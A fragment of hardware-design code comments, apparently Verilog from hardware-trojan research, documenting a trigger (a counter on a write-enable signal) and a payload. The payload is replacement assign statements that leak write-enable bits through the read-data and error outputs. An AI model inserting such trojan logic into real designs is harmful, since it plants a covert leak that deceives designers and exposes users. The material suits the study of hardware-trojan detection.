 ...
 *   
 * Trigger: Counter on wr_cl_we_i
 * Payload: Route rd_data_o[0] to observable output
 * 
...
//   Replace with:
//     assign rd_data_o = trojan_active ? wr_cl_we_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? wr_cl_we_i[0] : 1'b0;
//
